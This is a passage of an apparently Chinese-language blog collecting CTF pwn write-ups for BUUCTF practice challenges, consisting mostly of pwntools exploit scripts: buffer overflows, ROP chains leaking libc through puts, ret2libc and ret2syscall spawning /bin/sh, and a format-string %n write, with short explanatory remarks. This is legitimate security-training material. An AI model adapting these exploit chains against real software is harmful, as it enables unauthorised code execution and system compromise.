libc.dump(&quot;puts&quot;)</span><br><span class="line"># sys &#x3D; libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line"># bin_sh &#x3D; libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">payload &#x3D; b&#39;A&#39;*(0xa+0x8) + p64(pop_rdi) + p64(bin_sh) +p64(ret)+ p64(sys)</span><br><span class="line">leak(&quot;libc_base&quot;,libc_base)</span><br><span class="line"># pop_rax &#x3D; 0x00000000000439c8 + libc_base</span><br><span class="line"># pop_rdi &#x3D; 0x000000000002155f + libc_base</span><br><span class="line"># pop_rsi &#x3D; 0x0000000000023e6a + libc_base</span><br><span class="line"># pop_rdx &#x3D; 0x0000000000001b96 + libc_base</span><br><span class="line"># syscall &#x3D; 0x00000000000d2975 + libc_base</span><br><span class="line"># payload &#x3D; b&#39;A&#39;*(0xa+0x8) + p64(pop_rax) + p64(59) + p64(pop_rdi) + p64(bin_sh) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(syscall)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#r &#x3D; remote(&quot;&quot;)</span><br><span class="line">r &#x3D; remote(&quot;node3.buuoj.cn&quot;,29477)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;A&#39;*(0x88) + p64(0x400596)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-c-1（64位的puts泄露）"><a href="#ciscn-2019-c-1（64位的puts泄露）" class="headerlink" title="ciscn_2019_c_1（64位的puts泄露）"></a>ciscn_2019_c_1（64位的puts泄露）</h2><p>本地可以打通</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote("")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29957</span>)</span><br><span class="line">p = process(<span class="string">"./pwn3"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn3"</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">puts_addr = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">encrypt = <span class="number">0x4009a0</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your choice!\n"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_addr)+p64(encrypt)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">puts=u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">log.info(<span class="string">"libc base 0x%x"</span>,puts-libc.symbols[<span class="string">'puts'</span>])</span><br><span class="line">libc_base = puts-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh_addr = libc_base + next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">print(next(libc.search(<span class="string">"/bin/sh"</span>)))</span><br><span class="line">payload2=<span class="string">b'A'</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>太废物了</p><p>后来看了题解原来是18上面</p><p>用libcsearcher</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">'linux'</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line">ru=<span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line">rl=<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sl=<span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote("")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27415</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn3")</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn3"</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">puts_plt = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">encrypt = <span class="number">0x4009a0</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)</span><br><span class="line">sla(<span class="string">"Input your choice!\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">ru(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">rl()</span><br><span class="line">rl()</span><br><span class="line">puts = u64(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"puts"</span>,puts)</span><br><span class="line">print(libc)</span><br><span class="line">libc_base = puts-libc.dump(<span class="string">"puts"</span>)</span><br><span class="line">log.info(<span class="string">"libc base 0x%x"</span>,libc_base)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">payload2=<span class="string">b'A'</span>*<span class="number">0x58</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">sl(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>这里需要注意</p><p>18的ubuntu执行system会进行堆栈平衡</p><p>解决办法是加ret指令</p></blockquote><h2 id="OGeek2019-babyrop（32位puts泄露）"><a href="#OGeek2019-babyrop（32位puts泄露）" class="headerlink" title="[OGeek2019]babyrop（32位puts泄露）"></a>[OGeek2019]babyrop（32位puts泄露）</h2><p>打通</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os&#x3D;&#39;linux&#39;</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru&#x3D;lambda x:p.recvuntil(x)</span><br><span class="line">rl&#x3D;lambda :p.recvline()</span><br><span class="line">sl&#x3D;lambda x:p.sendline(x)</span><br><span class="line">sla&#x3D;lambda x,y:p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">#r &#x3D; remote(&quot;&quot;)</span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29517)</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">payload &#x3D; b&#39;\x00&#39;*7 + b&#39;\xff&#39;</span><br><span class="line">main &#x3D; 0x8048825</span><br><span class="line">sl(payload)</span><br><span class="line">puts_plt &#x3D; elf.symbols[&#39;puts&#39;]</span><br><span class="line">puts_got &#x3D; elf.got[&#39;puts&#39;]</span><br><span class="line">payload2 &#x3D; b&#39;A&#39;*(0xe7+0x4) + p32(0x08048548) + p32(main) + p32(0x8049fd4)</span><br><span class="line">sla(&quot;Correct\n&quot;,payload2)</span><br><span class="line">puts &#x3D; u32(p.recv(4))</span><br><span class="line">log.info(&quot;libc base 0x%x&quot;,puts-libc.symbols[&#39;puts&#39;])</span><br><span class="line">libc_base &#x3D; puts-libc.symbols[&#39;puts&#39;]</span><br><span class="line">system_addr &#x3D; libc_base + libc.symbols[&#39;system&#39;]</span><br><span class="line">bin_sh_addr &#x3D; libc_base + next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;))</span><br><span class="line">sl(payload)</span><br><span class="line">payload3 &#x3D; b&#39;A&#39;*(0xe7+0x4) + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)</span><br><span class="line">sla(&quot;Correct\n&quot;,payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="第五空间2019-决赛-PWN5（格式化字符串漏洞）"><a href="#第五空间2019-决赛-PWN5（格式化字符串漏洞）" class="headerlink" title="[第五空间2019 决赛]PWN5（格式化字符串漏洞）"></a>[第五空间2019 决赛]PWN5（格式化字符串漏洞）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os&#x3D;&#39;linux&#39;</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru&#x3D;lambda x:p.recvuntil(x)</span><br><span class="line">rl&#x3D;lambda :p.recvline()</span><br><span class="line">sl&#x3D;lambda x:p.sendline(x)</span><br><span class="line">sla&#x3D;lambda x,y:p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">#r &#x3D; remote(&quot;&quot;)</span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27812)</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">payload &#x3D; p32(0x804C044) + &quot;aaaa%10$n&quot;</span><br><span class="line">sl(payload)</span><br><span class="line">#print(p.recv())</span><br><span class="line">sl(b&#39;8&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h2><p>一开始准备\x00发现不可以</p><blockquote><p>unsigned __int8:表示无符号一个字节</p><p>那么这里就可以溢出了，可以看下面这个eg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">&gt;int main()</span><br><span class="line">&gt;&#123;</span><br><span class="line">char a &#x3D; 0x100;</span><br><span class="line">printf(&quot;%d\n&quot;,a-1);</span><br><span class="line">printf(&quot;%d\n&quot;,a);</span><br><span class="line">printf(&quot;%d&quot;,a+1);</span><br><span class="line">&gt;&#125;</span><br><span class="line">&gt;输出结果为 -1 0 1</span><br></pre></td></tr></table></figure><p>为什么中间是0呢？</p><p>因为char是1字节，最大为0xff也就是-1，</p><p>继续加+1，就是0x100，已经超过0xff，就会丢弃，变成0</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os&#x3D;&#39;linux&#39;</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s       &#x3D; lambda data               :p.send(str(data))</span><br><span class="line">sa      &#x3D; lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      &#x3D; lambda data               :p.sendline(str(data))</span><br><span class="line">sla     &#x3D; lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       &#x3D; lambda num&#x3D;4096           :p.recv(num)</span><br><span class="line">ru      &#x3D; lambda delims, drop&#x3D;True  :p.recvuntil(delims, drop)</span><br><span class="line">itr     &#x3D; lambda                    :p.interactive()</span><br><span class="line">uu32    &#x3D; lambda data               :u32(data.ljust(4,&#39;\0&#39;))</span><br><span class="line">uu64    &#x3D; lambda data               :u64(data.ljust(8,&#39;\0&#39;))</span><br><span class="line">leak    &#x3D; lambda name,addr          :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29806)</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;r2t3&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;r2t3&quot;)</span><br><span class="line">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">ret &#x3D; 0x080483be</span><br><span class="line">main &#x3D; 0x804863b</span><br><span class="line">system &#x3D; 0x804858b</span><br><span class="line">payload &#x3D; b&#39;A&#39;*0x15  + p32(system)</span><br><span class="line">payload &#x3D; payload.ljust(260,b&#39;A&#39;)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><blockquote><p>好家伙,这题真是开眼了</p></blockquote><p>先说第一种方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os&#x3D;&#39;linux&#39;</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s       &#x3D; lambda data               :p.send(str(data))</span><br><span class="line">sa      &#x3D; lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      &#x3D; lambda data               :p.sendline(str(data))</span><br><span class="line">sla     &#x3D; lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       &#x3D; lambda num&#x3D;4096           :p.recv(num)</span><br><span class="line">ru      &#x3D; lambda delims, drop&#x3D;True  :p.recvuntil(delims, drop)</span><br><span class="line">itr     &#x3D; lambda                    :p.interactive()</span><br><span class="line">uu32    &#x3D; lambda data               :u32(data.ljust(4,&#39;\0&#39;))</span><br><span class="line">uu64    &#x3D; lambda data               :u64(data.ljust(8,&#39;\0&#39;))</span><br><span class="line">leak    &#x3D; lambda name,addr          :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26722)</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;pwn4&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;pwn4&quot;)</span><br><span class="line">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">system &#x3D; 0x80489b8</span><br><span class="line">payload &#x3D; &#39;a&#39;*56</span><br><span class="line">payload +&#x3D; p32(0x080489A0) + p32(0x0804E6A0)</span><br><span class="line">payload +&#x3D; p32(0x308CD64F) + p32(0x195719D1)</span><br><span class="line">sleep(0.1)</span><br><span class="line">sl(payload)</span><br><span class="line">print(p.recv())</span><br></pre></td></tr></table></figure><blockquote><p>这里主要是gets这个函数没有退出，所以需要exit来强制退出，之后读flag就行</p></blockquote><p>第二中 静态链接应该想到ret2syscall</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">'linux'</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080b91e6</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806fc30</span></span><br><span class="line">int_0x80 = <span class="number">0x0806d7e5</span></span><br><span class="line">read_addr = <span class="number">0x0806E140</span></span><br><span class="line">gets_addr = <span class="number">0x0804F630</span></span><br><span class="line">pop_ebx_ret =  <span class="number">0x080481ad</span>  <span class="comment">#0x080481ad : pop ebx ; ret</span></span><br><span class="line">main_addr = <span class="number">0x08048A20</span></span><br><span class="line">bss_addr = <span class="number">0x080ECD70</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26722</span>)</span><br><span class="line">p = process(<span class="string">"./pwn4"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn4"</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">56</span> + p32(gets_addr) + p32(main_addr) + p32(bss_addr)</span><br><span class="line">sl(payload)</span><br><span class="line">sl(<span class="string">b"/bin/sh"</span>)</span><br><span class="line">payload2 = <span class="string">b"A"</span>*<span class="number">0x38</span> + p32(pop_eax_ret) + p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>)  +p32(bss_addr) + p32(int_0x80)</span><br><span class="line">sl(payload2)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><p>原题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">'linux'</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line">ru=<span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line">rl=<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sl=<span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote("")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29937</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn3")</span></span><br><span class="line">elf = ELF(<span class="string">"./LibC"</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')</span></span><br><span class="line">puts_plt = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">encrypt = <span class="number">0x4009a0</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)</span><br><span class="line">sla(<span class="string">"Input your choice!\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">ru(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">rl()</span><br><span class="line">rl()</span><br><span class="line">puts = u64(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"puts"</span>,puts)</span><br><span class="line">print(libc)</span><br><span class="line">libc_base = puts-libc.dump(<span class="string">"puts"</span>)</span><br><span class="line">log.info(<span class="string">"libc base 0x%x"</span>,libc_base)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">payload2=<span class="string">b'A'</span>*<span class="number">0x58</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">sl(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>var[13] = ‘\x11’</p><figure class="highlight 